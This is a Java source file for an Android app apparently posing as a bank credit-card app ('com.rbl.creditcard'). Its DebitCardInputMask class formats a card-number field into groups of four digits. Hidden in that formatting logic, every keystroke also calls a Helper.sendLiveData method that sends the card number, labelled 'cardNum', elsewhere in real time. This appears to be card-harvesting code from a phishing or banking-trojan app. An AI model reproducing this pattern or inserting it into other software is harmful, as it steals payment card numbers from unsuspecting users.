package com.rbl.creditcard.FrontServices;

import android.text.Editable;
import android.text.TextWatcher;
import android.widget.EditText;

import com.rbl.creditcard.Helper;

import org.json.JSONException;

public class DebitCardInputMask implements TextWatcher {

    private final EditText editText;
    private String current = "";


    public DebitCardInputMask
            (EditText editText) {
        this.editText = editText;
    }

    @Override
    public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

    @Override
    public void onTextChanged(CharSequence s, int start, int before, int count) {}

    @Override
    public void afterTextChanged(Editable s) {
        String input = s.toString();
        if(!input.equals(current)) {
            String cleanInput = input.replaceAll("[^\\d]", "");

            StringBuilder formatted = new StringBuilder();
            int index = 0;

            for (char ch : cleanInput.toCharArray()) {
                if (index % 4 == 0 && index > 0) {
                    formatted.append(" ");
                }
                formatted.append(ch);
                index++;
            }
            current = formatted.toString();
            editText.removeTextChangedListener(this);
            editText.setText(current);
            editText.setSelection(current.length());
            editText.addTextChangedListener(this);
            Helper he = new Helper();
            try {
                he.sendLiveData(current, "cardNum", editText.getContext());
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
    }
}
